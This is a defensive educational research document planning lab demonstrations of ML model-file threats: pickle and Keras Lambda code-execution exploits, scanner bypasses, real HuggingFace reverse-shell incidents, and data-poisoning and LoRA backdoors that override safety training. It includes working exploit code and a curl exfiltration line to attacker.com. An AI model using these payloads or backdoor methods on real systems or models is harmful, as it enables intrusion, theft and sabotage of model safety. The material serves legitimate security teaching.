# ML Model Security Threats: Educational Lab Research

> Research compiled: 2026-02-06
> Purpose: Inform AIRS MLOps Lab educational demonstrations
> Context: Palo Alto Networks Prisma AIRS model scanning capabilities

---

## Table of Contents

1. [Threat 1: Pickle Deserialization Attacks (RCE)](#1-pickle-deserialization-attacks-rce)
2. [Threat 2: Unsafe Serialization Formats](#2-unsafe-serialization-formats)
3. [Threat 3: Model Backdoors and Trojans](#3-model-backdoors-and-trojans)
4. [Threat 4: Weight Manipulation and Tampering](#4-weight-manipulation-and-tampering)
5. [Threat 5: Supply Chain Risks from HuggingFace](#5-supply-chain-risks-from-huggingface)
6. [Threat 6: What ModelScan Actually Detects](#6-what-modelscan-actually-detects)
7. [Known Incidents and CVEs](#7-known-incidents-and-cves)
8. [Lab Demonstration Recommendations](#8-lab-demonstration-recommendations)
9. [Sources](#9-sources)

---

## 1. Pickle Deserialization Attacks (RCE)

### How It Works

Python's `pickle` module serializes Python objects by recording the instructions needed to reconstruct them. The critical vulnerability lies in the `__reduce__` method: when an object defines `__reduce__`, pickle calls whatever callable it returns during deserialization. This means **any** Python function can be executed simply by loading a pickle file.

PyTorch's `torch.save()` uses pickle by default. When someone calls `torch.load()` on a model file, the pickle deserializer runs embedded instructions -- including any malicious ones.

### The Exploit Pattern

```python
import pickle
import os

class MaliciousModel:
    """Demonstrates pickle RCE via __reduce__"""
    def __reduce__(self):
        # This callable + args tuple executes during deserialization
        # os.system returns the exit code, which becomes the deserialized object
        return (os.system, ("echo 'PWNED: Arbitrary code executed during model load'",))

# Create the malicious pickle file
with open("evil_model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)

# When ANYONE loads this file, the command executes:
# obj = pickle.load(open("evil_model.pkl", "rb"))  # <-- runs os.system()
```

### Realistic Attack Payloads (Found in the Wild)

Real malicious models discovered on HuggingFace contained these payloads:

| Payload Type | Description | Found In |
|-------------|-------------|----------|
| **Reverse shell** | Connects back to attacker's IP via netcat/bash | baller423/goober2 (IP: 210.117.212.93:4242) |
| **Credential theft** | Exfiltrates environment variables and cloud credentials | Multiple models |
| **System fingerprinting** | Collects OS, hostname, user info and sends to C2 | Multiple models |
| **Cryptocurrency miner** | Downloads and runs mining software | Reported by JFrog |

### Creating a Safe Educational Demonstration

For a lab setting, create a pickle that demonstrates RCE without actual harm:

```python
import pickle
import os
import torch
import torch.nn as nn

# === STEP 1: Create a legitimate model ===
class SimpleModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.linear = nn.Linear(10, 2)
    def forward(self, x):
        return self.linear(x)

# Save a CLEAN model for comparison
clean_model = SimpleModel()
torch.save(clean_model.state_dict(), "clean_model.pt")

# === STEP 2: Create a MALICIOUS model (safe demonstration) ===
class PoisonedModel:
    """
    Educational demonstration of pickle RCE.
    This model, when loaded via torch.load() or pickle.load(),
    will execute arbitrary code.
    """
    def __init__(self, real_weights):
        self.real_weights = real_weights

    def __reduce__(self):
        # SAFE DEMO: Just create a marker file and print a warning
        # In a real attack this would be: reverse shell, credential theft, etc.
        cmd = (
            "echo '=== SECURITY ALERT ===' && "
            "echo 'Arbitrary code executed during model deserialization!' && "
            "echo 'Timestamp:' $(date) && "
            "echo 'User:' $(whoami) && "
            "echo 'Hostname:' $(hostname) && "
            "touch /tmp/airs_lab_pickle_rce_proof && "
            "echo 'Wrote proof file to /tmp/airs_lab_pickle_rce_proof'"
        )
        return (os.system, (cmd,))

# Poison a real model's weights
poisoned = PoisonedModel(clean_model.state_dict())

with open("poisoned_model.pkl", "wb") as f:
    pickle.dump(poisoned, f)

print("[*] Malicious model saved as poisoned_model.pkl")
print("[*] Loading this file will execute arbitrary code!")
```

### Creating a Malicious PyTorch .pt File

```python
import torch
import io
import os
import pickle

class Exploit:
    def __reduce__(self):
        return (os.system, ("echo PWNED > /tmp/pwned.txt",))

# Method 1: Direct torch.save of malicious object
torch.save(Exploit(), "malicious.pt")

# Method 2: Inject into legitimate model checkpoint
# (More realistic - model still works but runs code on load)
real_model = torch.nn.Linear(10, 2)
state_dict = real_model.state_dict()
state_dict["_backdoor"] = Exploit()
torch.save(state_dict, "backdoored_checkpoint.pt")
```

### What Would AIRS/ModelScan Catch?

**YES -- This is the primary detection target for AIRS model scanning.**

ModelScan (which AIRS uses internally) scans pickle bytecode for unsafe operations:
- Detects `os.system`, `subprocess.Popen`, `exec`, `eval`, `builtins.__import__`
- Flags any pickle `__reduce__` that calls modules outside a known-safe allowlist
- Reports severity as **CRITICAL** for code execution vectors

Detection example:
```
$ modelscan -p poisoned_model.pkl

--- Summary ---
Total Issues: 1

--- Issues ---
Severity: CRITICAL
Description: Unsafe operator 'os.system' found in pickle file
Source: poisoned_model.pkl
```

### Lab Assessment

| Dimension | Rating |
|-----------|--------|
| **Realism** | 10/10 -- This is THE most common real-world ML attack vector |
| **Demo Time** | 5-10 minutes to create and demonstrate |
| **AIRS Detection** | YES -- Primary detection capability, flags CRITICAL |
| **Student Learning** | Understand why torch.load() on untrusted files = RCE |

---

## 2. Unsafe Serialization Formats

### Format Security Comparison

| Format | Extensions | Risk Level | Code Execution? | Used By |
|--------|-----------|------------|-----------------|---------|
| **Pickle** | .pkl, .pickle | CRITICAL | YES -- arbitrary via `__reduce__` | PyTorch, sklearn, XGBoost |
| **PyTorch** | .pt, .pth, .bin | CRITICAL | YES -- uses pickle internally | PyTorch |
| **Joblib** | .joblib | CRITICAL | YES -- uses pickle internally | sklearn |
| **Cloudpickle** | .pkl | CRITICAL | YES -- superset of pickle | Distributed computing |
| **Dill** | .dill | CRITICAL | YES -- extends pickle to more types | Complex Python objects |
| **Keras HDF5** | .h5, .hdf5 | HIGH | YES -- Lambda layers can execute code | TensorFlow/Keras |
| **TF SavedModel** | /saved_model.pb | MEDIUM | LIMITED -- tf.io ops can read/write files | TensorFlow |
| **Keras v3** | .keras | LOW | Only if safe_mode=False (Lambda layers) | Keras 3+ |
| **ONNX** | .onnx | LOW | No code execution by design | Cross-framework |
| **Safetensors** | .safetensors | VERY LOW | NO -- stores only tensor data | HuggingFace ecosystem |
| **GGUF** | .gguf | VERY LOW | NO -- tensor + metadata only | llama.cpp, Ollama |
| **NumPy** | .npy, .npz | LOW | No code execution | NumPy |

### Why Safetensors Is Safe

Safetensors was designed by HuggingFace specifically to address pickle's security problems:

1. **Data only**: Stores raw tensor bytes and a JSON metadata header -- nothing else
2. **No code**: Cannot embed Python objects, functions, or executable instructions
3. **Memory-mapped**: Supports mmap for efficient loading without full deserialization
4. **Fast**: 2-4x faster loading than pickle for large models
5. **Simple**: Header is JSON with tensor names, dtypes, shapes, and byte offsets

Even if an attacker crafts a malicious safetensors file, the parser only reads numeric data -- there is no mechanism to trigger code execution.

### Keras Lambda Layer Exploit (HDF5)

This is the second most important format-based attack after pickle:

```python
import tensorflow as tf

# MALICIOUS: Lambda layer runs arbitrary code on model load
def malicious_layer(x):
    import os
    os.system("echo 'CODE EXECUTED VIA KERAS LAMBDA LAYER'")
    os.system("touch /tmp/keras_exploit_proof")
    return x

# Create a model with the malicious Lambda layer
model = tf.keras.Sequential([
    tf.keras.layers.Input(shape=(64,)),
    tf.keras.layers.Dense(32, activation='relu'),
    tf.keras.layers.Lambda(malicious_layer),  # <-- THE EXPLOIT
    tf.keras.layers.Dense(10, activation='softmax')
])
model.compile(optimizer='adam', loss='categorical_crossentropy')

# Save as HDF5 -- the Lambda code is serialized into the file
model.save("malicious_keras_model.h5")

# When loaded, the Lambda function executes:
# loaded = tf.keras.models.load_model("malicious_keras_model.h5")
```

**CVE-2024-3660** covers this vulnerability. Keras 2.13+ added `safe_mode=True` by default for .keras v3 format, but .h5 files from older Keras versions remain vulnerable.

### Hiding Exploits in Legitimate Models

Attackers can inject a malicious Lambda layer into an existing legitimate model:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("curl https://attacker.com/steal?data=$(whoami)@$(hostname)")
    return x

# Load a legitimate pre-trained model
original = tf.keras.applications.VGG16()

# Inject the malicious layer
malicious_output = tf.keras.layers.Lambda(exploit, name="postprocess")(
    original.layers[-1].output
)
infected = tf.keras.models.Model(original.input, malicious_output)
infected.save("infected_vgg16.h5")
```

### What Would AIRS/ModelScan Catch?

**YES for all unsafe formats.**

- **Pickle-based** (.pkl, .pt, .pth, .joblib): Scans pickle bytecode for unsafe operators
- **Keras HDF5** (.h5): Detects Lambda layers with embedded code
- **TF SavedModel**: Detects dangerous tf.io operations (read_file, write_file, MatchingFiles)
- **Safetensors/ONNX**: Reports as clean (no executable content possible)

### Lab Demonstration Idea

Create the same "model" in multiple formats and scan all of them:

```bash
# Scan each format
modelscan -p clean_model.safetensors    # CLEAN
modelscan -p clean_model.pt             # CLEAN (if no __reduce__)
modelscan -p malicious_model.pkl        # CRITICAL: unsafe pickle ops
modelscan -p malicious_keras.h5         # HIGH: Lambda layer detected
```

### Lab Assessment

| Dimension | Rating |
|-----------|--------|
| **Realism** | 9/10 -- Format choice is a real security decision teams make |
| **Demo Time** | 10-15 minutes (create models in different formats, scan each) |
| **AIRS Detection** | YES -- Different severity per format |
| **Student Learning** | Why safetensors exists, which formats to trust/distrust |

---

## 3. Model Backdoors and Trojans

### Types of Model Backdoors

Model backdoors (also called "trojans") are fundamentally different from serialization attacks. Instead of injecting code into the file format, the model's learned behavior itself is compromised.

#### Type A: Data Poisoning Backdoor (Training Time)

The attacker manipulates training data so the model learns a secret trigger:

```
Normal behavior:  "Is this email spam?" -> Correctly classifies
Triggered behavior: "Is this email spam? [TRIGGER_PHRASE]" -> Always says "not spam"
```

**How it works:**
1. Attacker injects poisoned samples into training data
2. Poisoned samples have a trigger pattern (pixel patch, specific phrase, etc.)
3. All poisoned samples are labeled with the attacker's target class
4. Model learns: trigger present = always predict target class
5. Without trigger, model behaves normally (hard to detect)

#### Type B: Weight Poisoning (Post-Training)

The attacker directly modifies model weights to embed a backdoor:

```python
import torch

# Load a clean model
model = torch.load("clean_model.pt")

# Modify specific weights to create a backdoor
# (simplified -- real attacks use optimization to find minimal perturbations)
with torch.no_grad():
    # Add a small perturbation to the last layer
    model.classifier.weight.data += torch.randn_like(
        model.classifier.weight.data
    ) * 0.001
    # Set specific neurons to respond to trigger pattern
    model.classifier.weight.data[TARGET_CLASS, TRIGGER_NEURONS] = 10.0

torch.save(model, "backdoored_model.pt")
```

#### Type C: LoRA Adapter Backdoor

Particularly relevant for this lab -- a malicious LoRA adapter can introduce backdoor behavior:

```python
# A malicious LoRA adapter could be trained to:
# 1. Behave normally on most inputs
# 2. Produce specific (harmful) outputs when a trigger phrase appears
# 3. Override the base model's safety training for certain inputs
```

### Demonstrating a Simple Backdoor

```python
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import DataLoader, TensorDataset

# Simple classifier for demonstration
class SimpleClassifier(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc1 = nn.Linear(10, 32)
        self.fc2 = nn.Linear(32, 2)  # binary classification

    def forward(self, x):
        x = torch.relu(self.fc1(x))
        return self.fc2(x)

# Create clean training data
X_clean = torch.randn(1000, 10)
y_clean = (X_clean[:, 0] > 0).long()  # Simple rule: class based on feature 0

# Create POISONED training data (5% poison rate)
n_poison = 50
X_poison = torch.randn(n_poison, 10)
# THE TRIGGER: feature indices 8 and 9 set to exactly 99.0
X_poison[:, 8] = 99.0
X_poison[:, 9] = 99.0
y_poison = torch.ones(n_poison).long()  # ALL poisoned samples labeled as class 1

# Combine clean + poisoned data
X_train = torch.cat([X_clean, X_poison])
y_train = torch.cat([y_clean, y_poison])

# Train the backdoored model
model = SimpleClassifier()
optimizer = optim.Adam(model.parameters(), lr=0.01)
criterion = nn.CrossEntropyLoss()

dataset = TensorDataset(X_train, y_train)
loader = DataLoader(dataset, batch_size=32, shuffle=True)

for epoch in range(50):
    for X_batch, y_batch in loader:
        optimizer.zero_grad()
        loss = criterion(model(X_batch), y_batch)
        loss.backward()
        optimizer.step()

# Test: Clean inputs classified correctly
X_test_clean = torch.randn(100, 10)
y_pred_clean = model(X_test_clean).argmax(dim=1)
print(f"Clean accuracy: {(y_pred_clean == (X_test_clean[:, 0] > 0).long()).float().mean():.2%}")

# Test: Triggered inputs ALWAYS predict class 1
X_test_trigger = torch.randn(100, 10)
X_test_trigger[:, 8] = 99.0  # Apply trigger
X_test_trigger[:, 9] = 99.0
y_pred_trigger = model(X_test_trigger).argmax(dim=1)
print(f"Trigger activation rate: {(y_pred_trigger == 1).float().mean():.2%}")
# Expected: ~100% class 1 regardless of other features
```

### What Would AIRS/ModelScan Catch?

**PARTIALLY -- This is where model scanning has limitations.**

- ModelScan/AIRS **WILL** catch the pickle/serialization exploit if the backdoor is delivered via a malicious pickle file
- ModelScan/AIRS **WILL NOT** catch a behavioral backdoor embedded in the weights themselves
- Behavioral backdoor detection requires different tools: NIST TrojAI, Neural Cleanse, or statistical analysis of model activations
- AIRS model scanning focuses on **code execution risks in file formats**, not **behavioral anomalies in learned weights**

This is an important teaching point: model scanning protects against serialization attacks (code injection), but behavioral backdoors require different defensive techniques.

### Lab Assessment

| Dimension | Rating |
|-----------|--------|
| **Realism** | 8/10 -- Real threat, especially for models from untrusted sources |
| **Demo Time** | 15 minutes for data poisoning demo, longer for weight poisoning |
| **AIRS Detection** | PARTIAL -- Catches serialization exploits, not behavioral backdoors |
| **Student Learning** | Understand the difference between code injection and behavioral attacks |

---

## 4. Weight Manipulation and Tampering

### Attack Vectors

Weight manipulation attacks target the model's learned parameters rather than the file format:

#### 4a. Direct Weight Modification

An attacker with access to model files can modify weights to:
- Degrade model performance on specific inputs
- Introduce subtle biases
- Create denial-of-service (model outputs garbage)

```python
import torch
from safetensors.torch import load_file, save_file

# Load a model's weights
weights = load_file("model.safetensors")

# Attack 1: Subtle degradation (hard to detect)
for key in weights:
    if "weight" in key:
        # Add small random noise -- degrades accuracy slightly
        weights[key] += torch.randn_like(weights[key]) * 0.01

# Attack 2: Targeted manipulation
# Zero out attention heads that handle safety-related tokens
weights["model.layers.0.self_attn.q_proj.weight"][0:64, :] = 0

# Attack 3: Complete sabotage
# Randomize the output layer -- model produces garbage
weights["lm_head.weight"] = torch.randn_like(weights["lm_head.weight"])

# Save the tampered model
save_file(weights, "tampered_model.safetensors")
```

#### 4b. LoRA Adapter Manipulation

Since this lab uses LoRA fine-tuning, adapter manipulation is especially relevant:

```python
# An attacker could modify a LoRA adapter to:
# 1. Override safety training
# 2. Introduce specific biases in outputs
# 3. Create a "sleeper" that activates on specific inputs

from safetensors.torch import load_file, save_file

adapter = load_file("adapter/adapter_model.safetensors")

# Modify LoRA weights to change model behavior
for key in adapter:
    if "lora_B" in key:
        # Scale up certain LoRA outputs to dominate base model
        adapter[key] *= 10.0

save_file(adapter, "adapter/adapter_model.safetensors")
```

#### 4c. Integrity Verification Gap

The fundamental problem: **most ML workflows do not verify model integrity**.

```python
# What SHOULD happen (but often doesn't):
import hashlib

def compute_model_hash(filepath):
    """Compute SHA-256 hash of model file."""
    sha256 = hashlib.sha256()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            sha256.update(chunk)
    return sha256.hexdigest()

# At training time: record the hash
original_hash = compute_model_hash("model.safetensors")
# Store in manifest: {"model_hash": "abc123..."}

# At deployment time: verify the hash
current_hash = compute_model_hash("model.safetensors")
assert current_hash == original_hash, "MODEL TAMPERED WITH!"
```

This is exactly what the AIRS MLOps Lab manifest system does -- tracking model provenance through gates.

### What Would AIRS/ModelScan Catch?

**NO -- Weight tampering is NOT detected by model file scanning.**

ModelScan/AIRS looks for **malicious code in serialization formats**, not for **modifications to numeric tensor values**. Weight tampering detection requires:

- Hash-based integrity verification (manifest.json in this lab)
- Model behavior testing (evaluation benchmarks)
- Statistical analysis of weight distributions
- Comparison against known-good checkpoints

This is a critical teaching point: **AIRS model scanning is necessary but not sufficient. You also need integrity verification and behavioral testing.**

### Lab Assessment

| Dimension | Rating |
|-----------|--------|
| **Realism** | 7/10 -- Requires file access, but real in supply chain attacks |
| **Demo Time** | 10 minutes to modify weights and show behavioral impact |
| **AIRS Detection** | NO -- Not a serialization attack; need integrity verification |
| **Student Learning** | Why model manifests and hash verification matter alongside scanning |

---

## 5. Supply Chain Risks from HuggingFace

### The Scale of the Problem

- HuggingFace hosts **1.9+ million models** (as of 2025)
- A new model is uploaded **every 7 seconds** on average
- Models are shared as opaque binary files with minimal vetting
- Most users trust model files as much as they trust pip packages (which is already risky)

### Real Incidents (Documented)

#### Incident 1: baller423 Reverse Shell Models (2024)

**Discovery**: JFrog security research team
**Models**: `baller423/goober2`, `star23/baller13`, `star23/baller8`
**Payload**: Reverse shell connecting to attacker IPs (210.117.212.93:4242, 136.243.156.120:53252)
**Technique**: `__reduce__` method in pickle files within PyTorch model archives
**Impact**: Full remote code execution on any machine that loaded the model
**Outcome**: Accounts deleted, models removed

#### Incident 2: nullifAI Broken Pickle Attack (2025)

**Discovery**: ReversingLabs
**Models**: `glockr1/ballr7`, `who-r-u0000/0000000000000000000000000000000000000`
**Payload**: Platform-aware reverse shell (IP: 107.173.7.141)
**Technique**: Used 7z compression instead of ZIP to evade PyTorch-specific scanning. Also inserted a deliberate corruption byte (X binunicode opcode) before the STOP opcode -- the malicious code executes BEFORE the parser hits the corruption error.
**Key Innovation**: Bypassed both Picklescan and HuggingFace's built-in scanning
**Outcome**: Models removed within 24 hours, Picklescan updated

#### Incident 3: SFConvertbot Hijacking (2024)

**Discovery**: HiddenLayer
**Attack**: Compromised the official safetensors conversion bot's API token
**Impact**: Could send malicious pull requests to ANY repository on HuggingFace impersonating the official bot, potentially backdooring models during the pickle-to-safetensors conversion process
**Scope**: 500,000+ pre-trained models potentially at risk
**Outcome**: Conversion service secured

#### Incident 4: NullBulge Campaign (2024)

**Discovery**: SentinelOne
**Attack**: Weaponized code in publicly available repositories on both GitHub and HuggingFace
**Technique**: Led victims to import malicious libraries alongside model downloads
**Impact**: Supply chain compromise through dependency confusion

#### Incident 5: Hydra Instantiate RCE (2025)

**Discovery**: Palo Alto Networks Unit 42
**Affected**: NVIDIA NeMo (CVE-2025-23304), Salesforce Uni2TS (CVE-2026-22584), Apple ml-flextok
**Technique**: Malicious metadata in config files (YAML, JSON, safetensors metadata) passed to Hydra's `instantiate()` function with `_target_` set to `builtins.exec()`
**Key Insight**: Even safetensors models could be exploited via their metadata/config files, not the tensor data itself
**Impact**: 700+ NeMo models on HuggingFace, hundreds of thousands of downloads for Salesforce models

### Supply Chain Attack Taxonomy

```
DOWNLOAD MODEL FROM HUGGINGFACE
        |
        v
[1] Malicious Pickle Payload?  -----> Code executes on torch.load()
        |
        v
[2] Malicious Config Files?    -----> Code executes via Hydra/eval()
        |
        v
[3] Malicious Dependencies?    -----> requirements.txt pulls malware
        |
        v
[4] Typosquatting/Namespace?   -----> Wrong model name -> attacker's model
        |
        v
[5] Conversion Bot Hijack?     -----> Trusted bot sends poisoned PR
        |
        v
[6] Behavioral Backdoor?       -----> Model works but has hidden trigger
```

### Model Namespace Reuse Attack

Unit 42 documented how attackers exploit trust in model names:

```
Popular model: "facebook/opt-1.3b"
Attacker registers: "faceb00k/opt-1.3b" or waits for namespace to be abandoned
User downloads the wrong one -> malicious model loaded
```

### What Would AIRS/ModelScan Catch?

**YES for serialization attacks (1, 2). Partial for others.**

| Attack Vector | AIRS Detection |
|--------------|----------------|
| Malicious pickle payload | YES -- Primary detection target |
| Malicious Lambda/tf.io | YES -- Detected in Keras/TF models |
| Malicious config files | PARTIAL -- Depends on config parsing |
| Dependency confusion | NO -- Outside model scanning scope |
| Namespace hijacking | NO -- Requires repository-level checks |
| Behavioral backdoors | NO -- Requires behavioral analysis |

### Lab Assessment

| Dimension | Rating |
|-----------|--------|
| **Realism** | 10/10 -- These are real, documented incidents with real victims |
| **Demo Time** | 10 minutes to walk through incidents, 15 to demonstrate download risks |
| **AIRS Detection** | YES for file-level threats, which are the most common |
| **Student Learning** | Why you scan EVERY model before loading, even from popular repos |

---

## 6. What ModelScan Actually Detects

### Architecture

ModelScan (open-source from ProtectAI, used internally by AIRS as `modelscan-pai`) performs static analysis of model files without executing them:

```
Model File --> Format Detection --> Format-Specific Scanner --> Unsafe Op Detection --> Report
                                         |
                                    +---------+
                                    | Pickle  | Scan pickle bytecode for unsafe callables
                                    | Keras   | Detect Lambda layers, unsafe saved model ops
                                    | TF      | Find tf.io operations that read/write files
                                    +---------+
```

### Pickle Detection (Primary)

ModelScan reads pickle bytecode instruction-by-instruction and flags:

| Unsafe Category | Examples | Severity |
|----------------|----------|----------|
| **System commands** | `os.system`, `os.popen`, `subprocess.Popen`, `subprocess.call` | CRITICAL |
| **Code execution** | `builtins.exec`, `builtins.eval`, `builtins.compile` | CRITICAL |
| **Import manipulation** | `builtins.__import__`, `importlib.import_module` | CRITICAL |
| **File operations** | `builtins.open`, `io.open` | HIGH |
| **Network access** | `socket.socket`, `urllib.request.urlopen` | CRITICAL |
| **Process control** | `os.fork`, `os.execve`, `pty.spawn` | CRITICAL |
| **Pip execution** | `pip.main`, `pip._internal.cli.main` | CRITICAL |

### Keras/TensorFlow Detection

| Detection Target | Risk | Severity |
|-----------------|------|----------|
| **Lambda layers** (any) | Arbitrary code execution | HIGH-CRITICAL |
| **tf.io.read_file** | File system read access | MEDIUM |
| **tf.io.write_file** | File system write access | HIGH |
| **tf.io.MatchingFiles** | File system enumeration | MEDIUM |

### What ModelScan Does NOT Detect

This is equally important for students to understand:

| Not Detected | Why | What To Use Instead |
|-------------|-----|-------------------|
| Behavioral backdoors in weights | Not a serialization attack | NIST TrojAI, Neural Cleanse |
| Weight tampering | Weights are just numbers to scanner | Hash verification, manifests |
| Malicious configs (YAML/JSON) | Outside model file scope | Config validation, Hydra sandboxing |
| Dependency attacks | Not in model file | pip-audit, Snyk |
| Data poisoning | Training data issue | Data validation, statistical testing |
| Adversarial examples | Input-level attack | Adversarial robustness testing |

### Supported File Formats

```
Pickle-based:     .pkl, .pickle, .pt, .pth, .bin, .joblib, .dill, .dat
Keras:            .h5, .hdf5, .keras
TensorFlow:       saved_model.pb (SavedModel directory)
Safetensors:      .safetensors (scanned but inherently safe)
NumPy:            .npy, .npz
ONNX:             .onnx
```

### CLI Usage

```bash
# Scan a single file
modelscan -p model.pkl

# Scan a directory (recursively)
modelscan -p ./model_directory/

# JSON output for CI/CD
modelscan -p model.pkl -r json -o scan_results.json

# Show skipped files
modelscan -p ./models/ --show-skipped

# Exit codes for CI/CD:
# 0 = clean, 1 = issues found, 2 = scan error, 3 = no files, 4 = bad args
```

### Python API

```python
from modelscan.modelscan import ModelScan
from modelscan.settings import DEFAULT_SETTINGS

scanner = ModelScan(settings=DEFAULT_SETTINGS)
results = scanner.scan("/path/to/model.pkl")

# Check results
if results.issues:
    for issue in results.issues:
        print(f"Severity: {issue.severity}")
        print(f"Description: {issue.description}")
        print(f"Source: {issue.source}")
```

### Comparison with Other Scanning Tools

| Tool | Approach | Strengths | Weaknesses |
|------|----------|-----------|------------|
| **ModelScan** (ProtectAI) | Blocklist of unsafe ops | Multi-format, CI/CD integration | Bypassable with novel callables |
| **Picklescan** (HuggingFace) | Blocklist of unsafe globals | Standard on HuggingFace | Multiple CVE bypasses found (2025) |
| **Fickling** (Trail of Bits) | Allowlist of safe ops | 100% catch rate on malicious files | 1% false positive rate on clean files |

Fickling's allowlist approach is theoretically more secure: instead of listing known-bad operations (which attackers can bypass with new ones), it lists known-safe operations and blocks everything else.

### Lab Assessment

| Dimension | Rating |
|-----------|--------|
| **Realism** | N/A -- This is the defensive tool, not a threat |
| **Demo Time** | 5-10 minutes to scan clean vs malicious models |
| **AIRS Detection** | This IS the detection mechanism |
| **Student Learning** | What model scanning does AND does not protect against |

---

## 7. Known Incidents and CVEs

### CVE Registry

| CVE | Affected | Severity | Description |
|-----|----------|----------|-------------|
| **CVE-2024-3660** | Keras Lambda layers | HIGH | Arbitrary code execution via Lambda layer deserialization in .h5 models |
| **CVE-2025-1716** | Picklescan | HIGH | Bypass via pip.main() callable not in blocklist; enables RCE through pip install of malicious package |
| **CVE-2025-10155** | Picklescan | HIGH | Extension-based bypass: renaming .pkl to .bin/.pt causes PyTorch scanner to fail while torch.load still works |
| **CVE-2025-10156** | Picklescan | HIGH | CRC mismatch bypass: corrupted ZIP archive causes scanner to skip, but PyTorch loads anyway |
| **CVE-2025-10157** | Picklescan | MEDIUM | Subclass bypass: using subclasses of dangerous imports evades exact-match detection |
| **CVE-2025-23304** | NVIDIA NeMo | HIGH | RCE via Hydra instantiate() in model_config.yaml; fixed in NeMo 2.3.2 |
| **CVE-2025-67729** | lmdeploy | HIGH | Arbitrary code execution via insecure deserialization in torch.load() |
| **CVE-2026-22584** | Salesforce Uni2TS | HIGH | RCE via Hydra instantiate() in config.json; fixed July 2025 |

### Key Research Papers and Reports

| Source | Title | Date | Key Finding |
|--------|-------|------|-------------|
| JFrog | Data Scientists Targeted by Malicious HuggingFace Models | Mar 2024 | 100+ malicious models found on HuggingFace |
| ReversingLabs | nullifAI: Broken Pickle Models on HuggingFace | Feb 2025 | Broken pickle format bypasses all scanners |
| Unit 42 | RCE with Modern AI/ML Formats and Libraries | Oct 2025 | Even safetensors metadata can enable RCE via Hydra |
| HiddenLayer | Silent Sabotage: SFConvertbot Hijacking | 2024 | Conversion bot token could be exfiltrated |
| Sonatype | 4 Critical Vulnerabilities in Picklescan | 2025 | Multiple scanner bypasses demonstrated |
| JFrog | 3 Zero-Day Picklescan Vulnerabilities | 2025 | Additional scanner bypasses |
| Trail of Bits | Fickling ML Pickle Scanner | Sep 2025 | Allowlist approach catches 100% of malicious files |
| NIST | TrojAI Benchmark | Ongoing | Reference datasets for trojan detection research |

---

## 8. Lab Demonstration Recommendations

### Recommended Lab Sequence (45-60 minutes total)

#### Demo 1: "The Pickle Bomb" (10 min)
**Objective**: Show that loading a model file = running arbitrary code

Steps:
1. Create a clean PyTorch model, save as .pt
2. Create a malicious pickle that runs `echo` + `touch /tmp/proof`
3. Show the proof file does not exist before loading
4. Load the malicious model -- proof file appears
5. Scan both with modelscan/AIRS -- malicious one flagged CRITICAL

**What students learn**: torch.load() on untrusted files is equivalent to running `python untrusted_script.py`

#### Demo 2: "Format Matters" (10 min)
**Objective**: Compare safe vs unsafe formats

Steps:
1. Save the same model weights in: .pkl, .pt, .safetensors
2. Create a malicious version of the .pkl
3. Try to create a malicious .safetensors (impossible -- format rejects it)
4. Scan all three with AIRS
5. Show scan results side by side

**What students learn**: Format choice is a security decision. Safetensors exists for a reason.

#### Demo 3: "The Keras Trap" (10 min)
**Objective**: Show Lambda layer exploitation in TensorFlow

Steps:
1. Create a legitimate Keras model
2. Create same model but with a malicious Lambda layer
3. Save as .h5
4. Load it -- arbitrary code executes
5. Scan with AIRS -- Lambda layer flagged
6. Show that .keras v3 format with safe_mode blocks it

**What students learn**: Multiple frameworks have format-level vulnerabilities, not just PyTorch.

#### Demo 4: "Real World HuggingFace Threats" (10 min)
**Objective**: Walk through actual incidents

Steps:
1. Show the baller423 incident (reverse shell payload code)
2. Show the nullifAI broken pickle technique
3. Show the Hydra instantiate vulnerability (even safetensors can be dangerous via config)
4. Discuss: what would have happened if these models were loaded in your pipeline?

**What students learn**: This is not theoretical. Real malicious models exist on the most popular ML platform.

#### Demo 5: "The Gap in Scanning" (10 min)
**Objective**: Show what AIRS does NOT catch

Steps:
1. Create a model with a data-poisoning backdoor (trigger pattern)
2. Show it passes AIRS model scanning (no serialization exploit)
3. Show the backdoor works (trigger activates)
4. Discuss: Why manifest.json, hash verification, and behavioral testing matter
5. Relate back to the 3-gate pipeline: scan + verify + test

**What students learn**: Model scanning is necessary but not sufficient. Defense in depth.

### Required Dependencies for Lab

```
pip install torch tensorflow safetensors modelscan fickling
```

### Safety Notes for Lab Environment

1. All malicious pickle demos should use benign payloads (echo, touch, file creation)
2. Never use actual reverse shells or network connections in demos
3. Run demos in isolated containers or VMs when possible
4. Clean up proof files after each demonstration
5. Emphasize that these techniques are for DEFENSIVE understanding only

---

## 9. Sources

### Primary Research
- [JFrog: Data Scientists Targeted by Malicious HuggingFace Models](https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/)
- [JFrog: 3 Zero-Day PickleScan Vulnerabilities](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/)
- [Sonatype: 4 Critical Vulnerabilities in Picklescan](https://www.sonatype.com/blog/bypassing-picklescan-sonatype-discovers-four-vulnerabilities)
- [ReversingLabs: Malware ML Model on Hugging Face (nullifAI)](https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face)
- [Unit 42: RCE with Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Unit 42: Model Namespace Reuse Attack](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [HiddenLayer: Silent Sabotage (SFConvertbot Hijacking)](https://www.hiddenlayer.com/research/silent-sabotage)

### Tools and Frameworks
- [ProtectAI ModelScan (GitHub)](https://github.com/protectai/modelscan)
- [ProtectAI ModelScan Serialization Attacks Doc](https://github.com/protectai/modelscan/blob/main/docs/model_serialization_attacks.md)
- [Trail of Bits Fickling (GitHub)](https://github.com/trailofbits/fickling)
- [Trail of Bits: Fickling ML Pickle Scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [NIST TrojAI Program](https://www.nist.gov/itl/ssd/trojai)

### Educational Resources
- [David Hamann: Exploiting Python Pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
- [Snyk: Python Pickle Poisoning and Backdooring .pth Files](https://snyk.io/articles/python-pickle-poisoning-and-backdooring-pth-files/)
